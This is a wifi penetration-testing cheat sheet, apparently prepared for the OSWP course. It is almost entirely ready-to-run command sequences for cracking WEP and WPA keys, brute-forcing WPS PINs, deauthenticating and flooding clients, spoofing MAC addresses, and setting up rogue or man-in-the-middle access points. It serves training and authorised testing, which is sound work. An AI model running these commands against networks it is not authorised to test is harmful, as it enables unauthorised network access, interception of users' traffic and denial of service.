# Wifi

### Tools

* Wifite - https://github.com/derv82/wifite
* Wifite2 Rewrite - https://github.com/kimocoder/wifite2
* Wifite2 Original - https://github.com/derv82/wifite2

### Linux Wireless Basics

```powershell
AP_MAC="XX:XX:XX:XX:XX"       # BSSID
VICTIM_MAC="XX:XX:XX:XX:XX"   # VIC
ATTACKER_MAC="XX:XX:XX:XX:XX" # MON
AP_SSID="wifibox"             # ESSID
SRC_ADDR="192.168.1.1"
DST_ADDR="192.168.1.255"
```

```powershell
# driver install
apt install realtek-rtl88xxau-dkms

# network card recon
iwconfig
iw list
dmesg | grep 8187 # alfa card

# Increase Wi-Fi TX Power
iw reg set B0
iwconfig wlan0 txpower <NmW|NdBm|off|auto> # txpower is 30 (usually)

# find SSID and channel
iw dev wlan0 scan | grep SSID
iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID"
iwlist wlan0 scanning | egrep "ESSID|Channel"

# monitor mode - start
airmon-ng start wlan0
airmon-ng start wlan0 3 # only on a particular channel e.g: 3
    * Manual 1: iw dev wlan0 interface add mon0 type monitor
    * Manual 2: iwconfig wlan0 mode monitor channel 3
ifconfig mon0 up
# monitor mode - stop
airmon-ng stop mon0
    * Manual 1: iw dev wlan0 interface del mon0 
    * Manual 2: iwconfig wlan0 mode managed
```

### Aircrack-ng Essentials

```powershell
# check and kill processes that could interfere with our monitor mode
airmon-ng check
airmon-ng check kill
# pkill dhclient; pkill wpa_supplicant; pkill dhclient3

# list AP
airodump-ng mon0
airodump-ng mon0 -c 3 # only on a particular channel e.g: 3
airodump-ng mon0 -c 3 --bssid $AP_MAC -w clearcap # dump traffic

# get our macaddress
macchanger -s mon0 
macchanger --show mon0

# replay and accelerate traffic
aireplay-ng
    * -i interface
    * -r file.pcap

# check aireplay card compatibility
aireplay-ng -9 mon0 -> test injection
aireplay-ng -9 -i wlan1 mon0 -> test card to card injection

# injection rate
iwconfig wlan0 rate 1M

# Aircrack compatibility
http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters
Alfa AWUS036H / TPLink WN722
```

#### Fake authentication attack

:warning: use it before each attack

```powershell
airodump-ng -c 3 --bssid $AP_MAC -w wep1 mon0

# fake authentication = no arp
aireplay-ng -1 0 -e AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0
    * Might need a real $ATTACKER_MAC, observe traffic using airodump
	> Association successful! :-)

# fake authentication for picky AP
# Send keep-alive packets every 10 seconds
aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

# might need to fake your MAC ADDRESS first
```

#### Deauthentication attack

> Force ARP packet to be sent.

```powershell
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
    * -0 : 1 deauthentication, 0 unlimited
	> Sending 64 directed DeAuth.
```

#### ARP Replay Attack

Video: wifu-20.mp4 The attack listens for an ARP packet and then retransmits it back to the access point. This, in turn, causes the AP to repeat the ARP packet with a new IV. By collecting enough of these IVs Aircrack-ng can then be used to crack the WEP key.

```powershell
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0
	* ATTACKER_MAC if fake authentication launched
	* CONNECTED_MAC if a client is associated

# –x 1000 –n 1000 ?
# aireplay-ng -3 –x 1000 –n 1000 –b $AP_MAC -h $ATTACKER_MAC wlan0mon
# wait for ARP on the network
# alternatively you can de-auth some clients

aircrack-ng –b <BSSID> <PCAP_of_FileName>
aircrack-ng -0 wep1.cap
    * -0 : colored output
```

### Cracking WEP via a Client

#### ARP Request Replay Attack

> Attack the ACCESS POINT

```powershell
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng mon0 -c 3 --bssid $AP_MAC -w arpreplay # dump traffic

# Fake authentication for a more reliable attack
aireplay-ng -1 0 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0

# ARP replay attack
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0

# Deauthentication
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# Cracking
aircrack-ng arpreplay.cap
```

#### Interactive replay attack

> Attack a client to force new packets 0841 attack, or interactive packet replay is a WEP attack that allows for packet injection when ARP replay is not available/working.

```powershell
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w clearcap mon0 # dump traffic

# fake authentication for a more reliable attack
aireplay-ng -1 0 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0

# interactive replay attack (min arp 68, max arp 86)
aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0 # interactive - natural selection of a packet
aireplay-ng -2 -b $AP_MAC -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 mon0  # interactive - force create a packet
# Packet selection (ARP packets met the characteristics): 
# - APs will always repeat packets destined to the broadcast
# - The packet will have the ToDS (To Distribution System) bit set to 1
# answer "y" multiple times

# cracking require ~> 250000 IVs
aircrack-ng -0 -z -n 64 clientwep-01.cap
    * -z: PTW attack
    * -n: number of bits in the WEP key

# backup file with an ARP packet
aireplay-ng -2 -r replay.cap mon0
```

### Cracking WEP without a Client

* Chopchop & Fragmentation attack => PRGA, generate more packets with weak IVs
* Need an AP configured with open system authentication

Prerequisite:

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wepcrack mon0 # see no client

# fake authentication attack with association timing (every 60s try to reassociate)
aireplay-ng -1 60 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0 # should see a client in airodump
# -1 6000 to avoid a time out.
```

#### Fragmentation attack

> Goal: 1500 bytes of PRGA Atheros does not generate the correct packets unless the wireless card is set to the MAC address you are spoofing.

```powershell
# attacker mac must be associated (fake auth)
# Press "Y"
aireplay-ng -5 -b $AP_MAC -h $ATTACKER_MAC mon0

# use our PRGA from the fragmentation attack to generate an ARP request
# SRC_ADDR: 192.168.1.100 
# DST_ADDR: 192.168.1.255, should not exist (broadcast address)
packetforge-ng -0 -a $AP_MAC -h $ATTACKER_MAC -l $SRC_ADDR -k $DST_ADDR -y frag.xor -w inject.cap
# -k: the destination IP i.e. in ARP, this is "Who has this IP"
# -l: the source IP i.e. in ARP, this is "Tell this IP"

# check the packet
tcpdump -n -vvv -e -s0 -r inject.cap

# inject our crafted packet
aireplay-ng -2 -r inject.cap mon0

# crack the WEP key
# Aircrack-ng will auto-update when new IVs are available
aircrack-ng -0 wepcrack

# if 64-bit WEP is used, cracking time < 5 minutes 
# switch to 128-bit keys after 600000 IVs
# use the `-f 4` after 2000000
aircrack-ng -n 64 <capture filename>
```

#### KoreK Chopchop attack

> Can't be used for every AP, might work when fragmentation fails Much slower than the fragmentation attack

```powershell
# chopchop attack: -4
# out decrypted: .cap
# out prga: .xor
# Press "Y" (choose a small packet)
aireplay-ng -4 -b $AP_MAC -h $ATTACKER_MAC mon0

# check the packet and find the network addresses
tcpdump -n -vvv -e -s0 -r inject.cap

# use our PRGA from the fragmentation attack
# SRC_ADDR: 192.168.1.100 
# DST_ADDR: 192.168.1.255, should not exist (broadcast address)
packetforge-ng -0 -a $AP_MAC -h $ATTACKER_MAC -l $SRC_ADDR -k $DST_ADDR -y prga.xor -w chochop_out.cap

# inject our crafted packet
aireplay-ng -2 -r chochop_out.cap mon0

# crack the WEP key
aircrack-ng -0 wepcrack
```

### Bypassing WEP Shared Key Authentication SKA

> By default, most wireless drivers will attempt open authentication first. If open authentication fails, they will proceed to try shared authentication.

Prerequisite:

* Authentication: Shared Key
* When Fake Authentication => `AP rejects open-system authentication`

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w sharedkey mon0

# deauthentication attack on the connected client
# airodump should display SKA under the AUTH column
# PRGA file will be saved as xxxx.xor
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
# TO CHECK aireplay-ng -0 10 –a $AP_MAC -c $VICTIM_MAC mon0

# fake authentication attack with association timing (every 60s try to reassociate)
# should display switching to Shared Key Authentication
# If you are using a PRGA  file obtained  from a chopchop attack, make sure that it is at least 144 bytes long
# If you have "Part2:  Association  Not  answering...(Step3)" -> spoof the mac address used to fake auth
aireplay-ng -1 60 -e $AP_SSID -y sharedkey.xor -b $AP_MAC -h $ATTACKER_MAC mon0

# ARP replay attack
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0

# deauthentication attack on the connected client
# speed the ARP attack process using deauth
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
# TO CHECK: aireplay-ng –-deauth 1 –a $AP_MAC -h <FakedMac> wlan0mon

# crack the WEP key
aircrack-ng sharedkey.cap
```

### Cracking WPA PSK

#### Cracking WPA with John the Ripper

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpajohn mon0 # see no client

# deauthentication to get the WPA handshake (Sniffing should show the 4-way handshake)
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# crack without john the ripper (-b <BSSID>)
aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap
aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap 
aircrack-ng -w password.lst,secondlist.txt wpajohn-01.cap # multiple dicts

# crack with john the ripper - combine mangling rules with aircrack
# rules example to add in /pentest/passwords/john/john.conf
# $[0-9]$[0-9]
# $[0-9]$[0-9]$[0-9]
john --wordlist=/pentest/wireless/aircrack-ng/test/password.lst --rules --stdout | aircrack-ng -0 -e $AP_SSID -w - /root/wpajohn

# generate PMKs for a faster cracking - Precomputed WPA Keys Database Attack
echo wifu > essid.txt
airolib-ng test.db --import essid essid.txt
airolib-ng test.db --stats
airolib-ng test.db --import passwd /pentest/passwords/john/password.lst
airolib-ng test.db --batch
airolib-ng test.db --stats
aircrack-ng -r test.db wpajohn-01.cap
# airolib-ng test.db --clean all

# Not in lab - Convert to hccap to use with John Jumbo
aircrack-ng <FileName>.cap -J <outFile>
hccap2john <outFile>.hccap > <JohnOutFile>
john <JohnOutFile>
```

#### Cracking WPA with coWPAtty

> Better for PMK Rainbow table attacks

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpacow mon0 # see no client

# deauthentication to get the WPA handshake
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# coWPAtty dictionary mode (slow)
cowpatty -r wpacow-01.cap -f /pentest/passwords/john/password.lst -2 -s $AP_SSID

# coWPAtty rainbow table mode (fast)
genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s $AP_SSID
cowpatty -r wpacow-01.cap -d wifuhashes -2 -s $AP_SSID
```

#### Cracking WPA with Pyrit

> Can use GPU

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpapyrit mon0 # see no client

# deauthentication to get the WPA handshake
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# clean the cap and extract only good packets
pyrit -r wpapyrit-01.cap analyze
pyrit -r wpapyrit-01.cap -o wpastripped.cap strip

# dictionary attack - slow ++
pyrit -r wpapyrit-01.cap -i /pentest/passwords/john/password.lst -b $AP_MAC attack_passthrough

# pre-computed hashes attack - slow on CPU
pyrit eval # pwds in database
pyrit -i /pentest/passwords/john/password.lst import_passwords # import in the database
pyrit -e $AP_SSID create_essid
pyrit batch # generate
pyrit -r wpastripped.cap attack_db 

# gpu power attack - fast on GPU
pyrit list_cores
pyrit -i /pentest/passwords/john/password.lst import_passwords # import in the database
pyrit -e $AP_SSID create_essid
pyrit batch
pyrit -r wpastripped.cap attack_db 
```

#### WPA WPS Attack

```powershell
airmon-ng start wlan0
airodump-ng mon0

# Install
apt-get -y install build-essential libpcap-dev aircrack-ng pixiewps
git clone https://github.com/t6x/reaver-wps-fork-t6x
apt-get install reaver

# Reaver integrated dumping tool (can also airodump-ng)
# Wash gives information about WPS being locked or not
# Locked WPS will have less success chances
wash -i mon0 

# Launch Reaver
reaver -i mon0 -b $AP_MAC -vv -S
reaver -i mon0 -c <Channel> -b $AP_MAC -p <PinCode> -vv -S
reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv


# Now using pixiexps, you can crack PIN offline
pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
# Then, you can use the PIN with reaver to get to cleartext password
reaver -i <monitor interface> -b <bssid> -c <channel>  -p <PIN>


# Some manufacturers have implemented protections
# You can try different switches to bypass
# -L = Ignore locked state
# -N = Don't send NACK packets when errors are detected
# -d = delay X seconds between PIN attempts
# -T = set timeout period to X second (.5 means half second)
# -r = After X attemps, sleep for Y seconds
reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
```

> Message "WARNING: Detected AP rate limiting, waiting 315 seconds before re-trying" -> AP is protected Message "WARNING: Receive timeout occured" -> AP is too far

#### WPA PMKID Attack

```powershell
INTERFACE=$(ifconfig | grep wlp | cut -d":" -f1) # mon0

# PMKID capture
# Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. 
# It can take a while to capture PKMID (several minutes++)
# We recommend running hcxdumptool up to 10 minutes before aborting.
# If an AP recieves our association request packet and supports sending 
# sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1
PMKID=$(sudo hcxdumptool -o test.pcapng -i $INTERFACE --enable_status  --filtermode=2)
echo $PMKID|grep 'FOUND PMKID' &> /dev/null
hcxpcaptool -z test.16800 test.pcapng

# Then convert the captured data to a suitable format for hashcat
# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
# -I retrieve identities from WiFi-traffic
# -U retrieve usernames from WiFi-traffic
# PMKID*MAC AP*MAC Station*ESSID
# 2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Cracking the HASH
hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt 

# Check clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR
```

#### Cracking WPA with Bettercap

```powershell
# install and update
go get github.com/bettercap/bettercap
cd $GOPATH/src/github.com/bettercap/bettercap
make build && sudo make install
sudo bettercap -eval "caplets.update; q"

# run and recon the wifi APs
sudo bettercap -iface wlan0
# this will set the interface in monitor mode and start channel hopping on all supported frequencies
> wifi.recon on 
# we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`
> set wifi.show.sort clients desc
# every second, clear our view and present an updated list of nearby WiFi networks
> set ticker.commands 'clear; wifi.show'
> ticker on
# use the good channel
> wifi.recon.channel 1
```

**Bettercap WPA - Deauth and crack**

```powershell
# use the bssid of the AP
> wifi.deauth e0:xx:xx:xx:xx:xx
/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
/path/to/hashcat -m 2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
```

**Bettercap WPA - PMKID attack**

```powershell
wifi.assoc all
/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```

### Additional Aircrack-NG Tools

#### Remove Wireless Headers

```powershell
airdecap-ng -b $AP_MAC open-network.cap
* -dec.cap: stripped version of the file
```

#### Decrypt a WEP encrypted capture file

```powershell
airdecap-ng -w $WEP_KEY wep.cap
```

#### Decrypt a WPA2 encrypted capture file

```powershell
airdecap-ng -e $AP_SSID -p $WPA_PASSWORD tkip.cap
```

#### Remote Aircrack Suite

```powershell
airmon-ng start wlan0 3
airserv-ng -p 1337 -c 3 -d mon0
airodump-ng -c 3 --bssid $AP_MAC $HOST:$PORT
```

#### Wireless Intrusion Detection System

> Require wireless key and bssid

```powershell
airmon-ng start wlan0 3

# create the at0 interface
airtun-ng -a $AP_MAC -w $WEP_KEY mon0
# the interface will auto decrypt packets
```

### Wireless Reconnaissance

> Use CSV file from airodump

CAPR Graph

```powershell
airgraph-ng -i wifu-01.csv -g CAPR -o wifu-capr.png
# color
- green: wpa
- yellow: wep
- red: open
- black: unknown
```

CPG - Client Probe Graph

```powershell
airgraph-ng -i wifu-01.csv -g CPG -o wifu-cpg.png
```

### Kismet

```powershell
kismet
[enter][enter]
[tab][close]

# Select a source and begin a monitoring
Kismet > Add source > wlan0 > Add

.nettxt: data
.pcapdump: wireshark format
```

```powershell
# giskismet: kismet inside a SQL database
> require a GPS receiver

gpsd -n -N -D4 /dev/ttyUSB0
-N : foreground 
-D : debugging level

# kismet will gather SSID and GPS location
giskismet -x kismet.netxml

# generate a kml file (Google Earth)
giskismet -q "select * from wireless" -o allaps.kml
giskismet -q "select * from wireless where Encryption='WEP'" -o wepaps.kml
```

### Rogue Access Point

#### WPA handshake

```powershell
airmon-ng start wlan0 3
airodump-ng -c 3 -d $ATTACKER_MAC -w airbase mon0

# basic fake AP
airbase-ng -c 3 -e $AP_SSID mon0
airbase-ng -c 3 -e $AP_SSID -z 4 -W 1 mon0
-W 1 : WEP

# get a WPA handshake if the client connect
aircrack-ng -w /pentest/passwords/john/password.lst airbase-01.cap
```

#### Karmetasploit

```powershell
# install a dhcp server
apt install dhcp3-server

airmon-ng start wlan0 3
airbase-ng -c 3 -P -C 60 -e $AP_MAC -v mon0
-P: respond to all probes
ifconfig at0 up 10.0.0.1/24

mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd
touch /var/lib/dhcp3/dhcpd.leases

"CONF DHCP FROM VIDEO 75" > /tmp/dhcpd.conf

touch /tmp/dhcp.log
chown -R dhcpd:dhcpd /tmp/dhcp.log
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp/log at0

karma.rc from metasploit
# comment the first 2 lines (load sqlite)
msfconsole -r /root/karma.rc
```

#### Access Point MITM

```powershell
airmon-ng start wlan0 3
airbase-ng -c 3 -e $AP_SSID_SPOOFED mon0

# create a bridged interface
# apt-get install bridge-utils
brctl addbr hacker
brctl addif hacker eth0
brctl addif hacker at0

# assign IP addresses
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig hacker 192.168.1.8 up

# enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# mitm tools
driftnet
ettercap -G
Sniff > Unified sniffing > Hacker Interface
```

### Other things

```powershell
# Find Hidden SSID
aireplay-ng -0 20 –a <BSSID> -c <VictimMac> mon0

# Mac Filtering
macchanger –-mac <VictimMac> wlan0mon
aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
# MAC CHANGER
ifconfig wlan0mon down
macchanger –-mac <macVictima> wlan0mon
ifconfig wlan0mon up

# Deauth Global
aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

# Authentication DoS Mode
mdk3 wlan0mon a -a $AP_MAC

# Tshark - Filter and dislay data
tshark -r Captura-02.cap -Y "eapol" 2>/dev/null
tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" 2>/dev/null

# Convert .cap with handshake to .hccap
aircrack-ng -J network network.cap
```

### References

* [Wireless Penetration Testing Cheat Sheet [UPDATED – 2022]](https://uceka.com/2014/05/12/wireless-penetration-testing-cheat-sheet/)
* [Aireplay 0841 Attack – Introduction](https://www.doyler.net/security-not-included/aireplay-0841-attack)
* [Preparación para el OSWP (by s4vitar)](https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb)